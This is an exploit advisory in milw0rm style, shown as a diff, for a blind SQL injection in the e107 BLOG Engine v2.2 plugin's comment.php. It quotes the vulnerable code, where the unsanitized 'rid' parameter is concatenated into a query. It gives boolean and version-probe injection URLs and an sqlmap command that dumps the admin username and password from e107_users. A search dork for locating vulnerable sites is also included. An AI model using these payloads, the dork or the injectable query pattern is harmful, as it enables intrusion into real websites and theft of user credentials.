@@ -1,0 +1,25 @@
+[+] Author: Saime
+[+] Script: e107 Plugin BLOG Engine v2.2 (rid) Blind SQL Injection
+[+] URL: http://e107coders.org/download.php?view.1843
+[+] Date: 13/05/2008
+[+] Greetz: BaKo,DrWh4x,optiplex,xprog,cam-man-dan,Tulle,t0pP8uZz,Inspiratio,Novalok,illuz1oN,Untamed,GM,str0ke, and everyone else I forgot!
+[+] Site: http://h4ck-y0u.org
+
+[+] Vuln File: comment.php
+[+] Line: 22-24
+$rid = $_GET['rid'];
+//blog entry echo
+$sql -> db_Query("select ".MPREFIX."macgurublog_rec.*, blog_enable from ".MPREFIX."macgurublog_rec left join ".MPREFIX."macgurublog_main on (".MPREFIX."macgurublog_rec.blogrec_uid=".MPREFIX."macgurublog_main.blog_uid) where blogrec_id=".$rid.";");
+[+] Exploit:
+http://site.com/e107_plugins/macgurublog_menu/comment.php?rid=1 and 1=1-- // returns no errors
+http://site.com/e107_plugins/macgurublog_menu/comment.php?rid=1 and 1=2-- // returns error about unknown entry
+http://site.com/e107_plugins/macgurublog_menu/comment.php?rid=1 and substring(@@version,1,1)=4 // check the mysql version. if 4 returns error, try 5.
+Since e107 uses diffrent table names it's almost impossible to write exploit for it. So I am suggesting to use sqlmap to use this vulnerabilty.
+The command like should look like this:
+./sqlmap.py -u "URL" -p rid -a "./txt/user-agents.txt" -v1 --string "string which proofs the query is valid" -e "sql query"
+Example:
+./sqlmap.py -u "http://site.com/e107_plugins/macgurublog_menu/comment.php?rid=1" -p rid -a "./txt/user-agents.txt" -v1 --string "Saime" -e "<SELECT concat(username,0x3a,password) from e107_users where userid=1 limit 0,1>"
+[+] Dork: inurl:/macgurublog_menu/
+[+] Notes: Not to Turkish Warrior, good job on leaking CipherCrew exploits and submiting them as your own dumbass! ;)
+
+# milw0rm.com [2008-05-13]
